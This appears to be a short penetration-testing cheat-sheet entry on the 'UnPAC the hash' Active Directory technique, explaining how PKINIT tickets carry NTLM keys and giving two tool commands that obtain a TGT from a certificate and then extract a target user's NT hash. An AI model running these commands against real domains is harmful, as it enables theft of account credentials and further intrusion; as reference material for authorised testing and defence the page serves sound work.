# Unpack The Hash - Retrieve NTLM credentials using certificates

## Unpack The Hash - Retrieve NTLM credentials using certificates [t-ad-kerberos-unpac_the_hash]

When using PKINIT to obtain a TGT, the KDC includes in the ticket a PAC_CREDENTIAL_INFO 
structure containing the NTLM keys (i.e. LM and NT hashes) of the authenticating user. 
This feature allows users to switch to NTLM authentications when remote servers don't support Kerberos, 
while still relying on an asymmetric Kerberos pre-authentication verification mechanism (i.e. PKINIT).

Using S4U2Self extension it's possible to request a TGS ticket with PAC encrypted with the 
user`s key instead of krbtgt key.


### 1.1 Request a TGT using a PFX file



{% code overflow="wrap" %}
```bash
gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```
{% endcode %}

### 1.2 Use Kerberos U2U to submit a TGS request for yourself and extract the NT hash.



{% code overflow="wrap" %}
```bash
export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
```
{% endcode %}

